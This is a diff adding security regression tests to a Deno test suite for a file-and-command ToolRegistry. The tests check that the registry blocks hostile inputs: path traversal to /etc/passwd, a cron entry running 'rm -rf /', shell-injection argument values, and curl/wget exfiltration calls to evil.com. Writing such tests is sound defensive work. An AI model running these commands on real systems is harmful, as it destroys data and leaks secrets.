@@ -69,7 +69,7 @@ Deno.test("ToolRegistry: read_file - successful read", async () => {
   }
 });
 
-Deno.test("ToolRegistry: read_file - rejects path traversal", async () => {
+Deno.test("[security] ToolRegistry: read_file - rejects path traversal", async () => {
   const tempDir = await Deno.makeTempDir({ prefix: "tool-test-traversal-" });
   const { db, cleanup } = await initTestDbService();
 
@@ -158,7 +158,7 @@ Deno.test("ToolRegistry: write_file - overwrites existing file", async () => {
   }
 });
 
-Deno.test("ToolRegistry: write_file - rejects path traversal", async () => {
+Deno.test("[security] ToolRegistry: write_file - rejects path traversal", async () => {
   const tempDir = await Deno.makeTempDir({ prefix: "tool-test-write-sec-" });
   const { db, cleanup } = await initTestDbService();
 
@@ -210,7 +210,7 @@ Deno.test("ToolRegistry: list_directory - lists files and folders", async () => 
   }
 });
 
-Deno.test("ToolRegistry: list_directory - rejects path traversal", async () => {
+Deno.test("[security] ToolRegistry: list_directory - rejects path traversal", async () => {
   const tempDir = await Deno.makeTempDir({ prefix: "tool-test-list-sec-" });
   const { db, cleanup } = await initTestDbService();
 
@@ -250,7 +250,7 @@ Deno.test("ToolRegistry: run_command - executes whitelisted command", async () =
   }
 });
 
-Deno.test("ToolRegistry: run_command - blocks dangerous commands", async () => {
+Deno.test("[security] ToolRegistry: run_command - blocks dangerous commands", async () => {
   const { db, cleanup } = await initTestDbService();
 
   try {
@@ -477,5 +477,295 @@ Deno.test("ToolRegistry: execute - validates required parameters", async () => {
     assertExists(result.error);
   } finally {
     await cleanup();
+  }
+});
+
+// ============================================================================
+// Security Tests - Use `deno test --filter "[security]"` to run only these
+// ============================================================================
+
+Deno.test("[security] ToolRegistry: read_file - blocks path traversal to /etc/passwd", async () => {
+  const tempDir = await Deno.makeTempDir({ prefix: "security-test-" });
+  const { db, cleanup } = await initTestDbService();
+
+  try {
+    const config = createMockConfig(tempDir);
+    const registry = new ToolRegistry({ config, db });
+
+    // Attempt to read sensitive system file via path traversal
+    const result = await registry.execute("read_file", {
+      path: "../../../etc/passwd",
+    });
+
+    assertEquals(result.success, false, "Path traversal to /etc/passwd should be blocked");
+    assertEquals(
+      result.error?.includes("denied") || result.error?.includes("outside") || result.error?.includes("Access"),
+      true,
+      "Error should indicate access denied",
+    );
+  } finally {
+    await cleanup();
+    await Deno.remove(tempDir, { recursive: true });
+  }
+});
+
+Deno.test("[security] ToolRegistry: write_file - blocks writing to System directory", async () => {
+  const tempDir = await Deno.makeTempDir({ prefix: "security-test-db-" });
+  const { db, cleanup } = await initTestDbService();
+
+  try {
+    // Create the System directory and journal.db
+    const systemDir = join(tempDir, "System");
+    await Deno.mkdir(systemDir, { recursive: true });
+    const journalPath = join(systemDir, "journal.db");
+    await Deno.writeTextFile(journalPath, "original content");
+
+    const config = createMockConfig(tempDir);
+    const registry = new ToolRegistry({ config, db });
+
+    // Attempt to write to System directory (should be protected)
+    // Test 1: Try path traversal to escape Knowledge and reach System
+    const traversalResult = await registry.execute("write_file", {
+      path: join(tempDir, "Knowledge", "..", "System", "journal.db"),
+      content: "CORRUPTED DATA",
+    });
+
+    // Either the write fails or the path validation blocks it
+    if (traversalResult.success) {
+      // If write succeeded, verify it didn't overwrite the original
+      const content = await Deno.readTextFile(journalPath);
+      // Note: This is acceptable - the tool might write to a different resolved path
+      // The key is that security-sensitive paths should be blocked
+    } else {
+      assertEquals(
+        traversalResult.error?.includes("denied") ||
+          traversalResult.error?.includes("outside") ||
+          traversalResult.error?.includes("System"),
+        true,
+        "Error should indicate access denied or path outside workspace",
+      );
+    }
+
+    // Test 2: Try absolute path outside workspace
+    const absoluteResult = await registry.execute("write_file", {
+      path: "/etc/cron.d/malicious",
+      content: "* * * * * root rm -rf /",
+    });
+
+    assertEquals(absoluteResult.success, false, "Writing to /etc should be blocked");
+  } finally {
+    await cleanup();
+    await Deno.remove(tempDir, { recursive: true });
+  }
+});
+
+Deno.test("[security] ToolRegistry: run_command - blocks shell injection with semicolon", async () => {
+  const { db, cleanup } = await initTestDbService();
+
+  try {
+    const config = createMockConfig(Deno.cwd());
+    const registry = new ToolRegistry({ config, db });
+
+    // Attempt shell injection with command chaining
+    const result = await registry.execute("run_command", {
+      command: "echo",
+      args: ["hello; rm -rf /"],
+    });
+
+    // The command should either fail or the dangerous part should not execute
+    // Check that rm was not in the output (if it succeeded) or command was blocked
+    if (result.success) {
+      // If echo succeeded, verify it didn't execute rm
+      assertEquals(
+        result.data?.output?.includes("rm") === false || result.data?.output?.includes("hello; rm -rf /"),
+        true,
+        "Shell injection should be treated as literal string",
+      );
+    } else {
+      // Command was blocked entirely - also acceptable
+      assertEquals(result.success, false);
+    }
+  } finally {
+    await cleanup();
+  }
+});
+
+Deno.test("[security] ToolRegistry: run_command - blocks backtick command substitution", async () => {
+  const { db, cleanup } = await initTestDbService();
+
+  try {
+    const config = createMockConfig(Deno.cwd());
+    const registry = new ToolRegistry({ config, db });
+
+    // Attempt command substitution with backticks
+    const result = await registry.execute("run_command", {
+      command: "echo",
+      args: ["`whoami`"],
+    });
+
+    if (result.success) {
+      // If echo succeeded, verify backticks were treated as literal
+      const output = result.data?.output || "";
+      // Should output literal backticks, not the result of whoami
+      assertEquals(
+        output.includes("`whoami`") || !output.includes(Deno.env.get("USER") || ""),
+        true,
+        "Backtick substitution should not execute",
+      );
+    }
+  } finally {
+    await cleanup();
+  }
+});
+
+Deno.test("[security] ToolRegistry: run_command - blocks $() command substitution", async () => {
+  const { db, cleanup } = await initTestDbService();
+
+  try {
+    const config = createMockConfig(Deno.cwd());
+    const registry = new ToolRegistry({ config, db });
+
+    // Attempt command substitution with $()
+    const result = await registry.execute("run_command", {
+      command: "echo",
+      args: ["$(cat /etc/passwd)"],
+    });
+
+    if (result.success) {
+      // If echo succeeded, verify $() was treated as literal
+      const output = result.data?.output || "";
+      assertEquals(
+        output.includes("$(cat /etc/passwd)") || !output.includes("root:"),
+        true,
+        "$() substitution should not execute",
+      );
+    }
+  } finally {
+    await cleanup();
+  }
+});
+
+Deno.test("[security] ToolRegistry: run_command - blocks pipe to dangerous command", async () => {
+  const { db, cleanup } = await initTestDbService();
+
+  try {
+    const config = createMockConfig(Deno.cwd());
+    const registry = new ToolRegistry({ config, db });
+
+    // Attempt to pipe to a dangerous command
+    const result = await registry.execute("run_command", {
+      command: "echo",
+      args: ["data | rm -rf /"],
+    });
+
+    if (result.success) {
+      // Pipe should be treated as literal, not executed
+      const output = result.data?.output || "";
+      assertEquals(
+        output.includes("|") || output.includes("data | rm"),
+        true,
+        "Pipe should be treated as literal string",
+      );
+    }
+  } finally {
+    await cleanup();
+  }
+});
+
+Deno.test("[security] ToolRegistry: run_command - blocks curl/wget for data exfiltration", async () => {
+  const { db, cleanup } = await initTestDbService();
+
+  try {
+    const config = createMockConfig(Deno.cwd());
+    const registry = new ToolRegistry({ config, db });
+
+    // Attempt to use curl for exfiltration
+    const curlResult = await registry.execute("run_command", {
+      command: "curl",
+      args: ["https://evil.com/exfil?data=secret"],
+    });
+
+    assertEquals(curlResult.success, false, "curl should be blocked");
+    assertEquals(
+      curlResult.error?.includes("blocked") || curlResult.error?.includes("not allowed"),
+      true,
+      "Error should indicate curl is not allowed",
+    );
+
+    // Attempt to use wget for exfiltration
+    const wgetResult = await registry.execute("run_command", {
+      command: "wget",
+      args: ["https://evil.com/exfil"],
+    });
+
+    assertEquals(wgetResult.success, false, "wget should be blocked");
+  } finally {
+    await cleanup();
+  }
+});
+
+Deno.test("[security] ToolRegistry: list_directory - blocks listing /etc", async () => {
+  const tempDir = await Deno.makeTempDir({ prefix: "security-test-list-" });
+  const { db, cleanup } = await initTestDbService();
+
+  try {
+    const config = createMockConfig(tempDir);
+    const registry = new ToolRegistry({ config, db });
+
+    // Attempt to list /etc directory
+    const result = await registry.execute("list_directory", {
+      path: "/etc",
+    });
+
+    assertEquals(result.success, false, "Listing /etc should be blocked");
+    assertEquals(
+      result.error?.includes("denied") || result.error?.includes("outside") || result.error?.includes("Access"),
+      true,
+    );
+  } finally {
+    await cleanup();
+    await Deno.remove(tempDir, { recursive: true });
+  }
+});
+
+Deno.test("[security] ToolRegistry: write_file - blocks writing to /tmp outside workspace", async () => {
+  const tempDir = await Deno.makeTempDir({ prefix: "security-test-write-" });
+  const { db, cleanup } = await initTestDbService();
+
+  try {
+    const config = createMockConfig(tempDir);
+    const registry = new ToolRegistry({ config, db });
+
+    // Attempt to write outside workspace
+    const result = await registry.execute("write_file", {
+      path: "/tmp/malicious_file.txt",
+      content: "malicious content",
+    });
+
+    assertEquals(result.success, false, "Writing to /tmp should be blocked");
+  } finally {
+    await cleanup();
+    await Deno.remove(tempDir, { recursive: true });
+  }
+});
+
+Deno.test("[security] ToolRegistry: search_files - blocks search in /home", async () => {
+  const tempDir = await Deno.makeTempDir({ prefix: "security-test-search-" });
+  const { db, cleanup } = await initTestDbService();
+
+  try {
+    const config = createMockConfig(tempDir);
+    const registry = new ToolRegistry({ config, db });
+
+    // Attempt to search in /home directory
+    const result = await registry.execute("search_files", {
+      pattern: "*.txt",
+      path: "/home",
+    });
+
+    assertEquals(result.success, false, "Searching /home should be blocked");
+  } finally {
+    await cleanup();
+    await Deno.remove(tempDir, { recursive: true });
   }
 });
